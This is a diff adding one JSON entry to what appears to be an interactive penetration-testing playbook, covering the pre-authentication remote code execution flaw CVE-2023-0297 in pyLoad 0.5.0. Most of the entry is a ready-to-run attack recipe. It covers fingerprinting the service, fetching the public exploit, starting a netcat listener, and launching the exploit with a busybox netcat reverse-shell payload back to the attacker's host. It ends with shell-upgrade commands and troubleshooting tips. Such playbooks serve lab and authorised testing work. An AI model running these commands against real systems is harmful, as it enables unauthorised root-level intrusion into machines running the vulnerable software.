@@ -1,0 +1,13 @@
+{
+  "id": "pyload_rce",
+  "phase": "WEB",
+  "title": "pyLoad 0.5.0 — CVE-2023-0297 Pre-Auth RCE",
+  "body": "pyLoad is a download manager with a web UI. Version 0.5.0 has a pre-authentication remote code execution vulnerability — no login required. The exploit directly spawns a reverse shell as the user running pyLoad (often root).\n\nFingerprint: nmap shows CherryPy wsgiserver on port 9666 (or 8000), http-title 'Login - pyLoad'. Default credentials are pyload/pyload but the CVE doesn't need them.",
+  "cmd": "# ══════════════════════════════════════════════════\n# 1 — FINGERPRINT\n# ══════════════════════════════════════════════════\n# nmap: http-title: Login - pyLoad\n#       http-server-header: Cheroot/8.6.0\n# Default port: 9666 (sometimes 8000)\n# Default creds (not needed for exploit): pyload/pyload\n\n# ══════════════════════════════════════════════════\n# 2 — EXPLOIT (pre-auth RCE)\n# ══════════════════════════════════════════════════\nsearchsploit -m 51532\n# or: https://www.exploit-db.com/exploits/51532\n\n# Listener:\nnc -lvnp <LPORT>\n\n# Run exploit:\npython3 51532.py -u http://<IP>:9666 -c \"busybox nc <LHOST> <LPORT> -e /bin/bash\"\n\n# Shell lands as root (pyLoad often runs as root)\n# Upgrade immediately:\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl-Z → stty raw -echo; fg → export TERM=xterm\n\n# ══════════════════════════════════════════════════\n# 3 — VERIFY VERSION (if you can log in)\n# ══════════════════════════════════════════════════\n# pyLoad dashboard → bottom of page or Settings → Info\n# Version 0.5.0 = vulnerable",
+  "warn": "The shell often lands directly as root since pyLoad runs with elevated privileges. If the exploit runs but no callback, check the port — pyLoad can run on 9666 or 8000 depending on the install. Always try busybox nc if standard nc -e fails.",
+  "choices": [
+    {"label": "Got root — grab proof", "next": "got_root_linux"},
+    {"label": "Got user shell — privesc", "next": "linux_post_exploit"},
+    {"label": "Back to web enum", "next": "web_enum"}
+  ]
+}
